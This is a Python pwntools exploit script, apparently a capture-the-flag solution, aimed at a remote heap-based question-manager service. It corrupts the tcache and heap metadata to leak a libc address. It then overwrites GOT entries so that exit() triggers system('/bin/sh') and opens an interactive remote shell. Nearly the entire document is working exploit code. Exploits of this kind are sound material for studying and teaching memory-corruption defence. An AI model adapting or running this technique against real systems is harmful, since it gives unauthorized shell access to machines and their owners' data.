#!/usr/bin/env python2

from pwn import *

global p

####################################
# HELPER FUNCTIONS FOR THE PROGRAM #
def _create():
    p.sendlineafter("): ", "c")

def _delete(id):
    p.sendlineafter("): ", "d")
    p.sendlineafter("id: ", id)

def _set(id, question):
    p.sendlineafter("): ", "s")
    p.sendlineafter("id: ", id)
    p.sendlineafter("question: ", question)

def _ask(id, flag):
    p.sendlineafter("): ", "a")
    p.sendlineafter("id: ", id)

    # if the flag is set, return the output
    if (not flag): 
        return ""

    p.recvuntil(": '")
    return p.recvuntil("'", drop=True)
####################################

####################################
#                                  #
def _overwrite_size(size):
    payload = b""
    payload += b"\x00" * 0x1C
    payload += size
    payload += b"\x00" * 0x3

    return payload

def _flood_tcache():
    _create()
    _create()
    _create()
    _create()
    _create()
    _create()

    _set("0", _overwrite_size(b"\x01\x01"))

    _delete("0")
    _delete("1")
    _delete("1")
    _delete("1")
    _delete("1")
    _delete("1")
    _delete("1")
    _delete("0")
    _delete("1")
    _delete("2")
    _delete("1")
    _delete("0")

def _write_memory(dest, src):
    _set("6", b"\x00" * 0x18 + dest + "\x21" + "\x00" * 3)
    _set("6", p32(leaked - 0x20))

    _set("0", src)
####################################

p = remote("plsdonthaq.me", 7002)

# store entries in the tcache so that new free()s will be stored in the non-fast bins
# this also edits question 1's size to be 101 so that it will be placed in a large bin
_flood_tcache()

# the header for question 1 now stores <main_arena+56> so get the address stored in it's "question"
# and move back the correct offset to find the address storing question 1's prev
leaked = u32(_ask("1", True)) - 0x38

# overwrite question 2's "question" with the memory address
payload = _overwrite_size(b"\x21")
payload += b"\x00" * 0x18
payload += p32(0x0804b02c) # p32(leaked)
_set("1", payload)

# Print out question 2's "question" (which now leaks the memory address for <main_arena>)
leaked2 = u32(_ask("2", True)[:4])

libc   = leaked2 - 0x067b40 # - 0x170BC8 - 0x067c10 + 0x38
system = libc + 0x03d200 # 0x03d250

print_banner = 0x080486dc
banner       = 0x0804b060
puts         = 0x0804b02c
_exit        = 0x0804b014

# Overwrite puts() with system(), banner with 'bin/sh', and exit() with print_banner()
# Therefore when calling exit(), it will invoke puts(banner) (which is system("/bin/sh"))
_create()

_write_memory(p32(_exit), p32(print_banner))
_write_memory(p32(banner), b"/bin/sh\x00")
_write_memory(p32(puts), p32(system))

_ask("99", False)

p.interactive()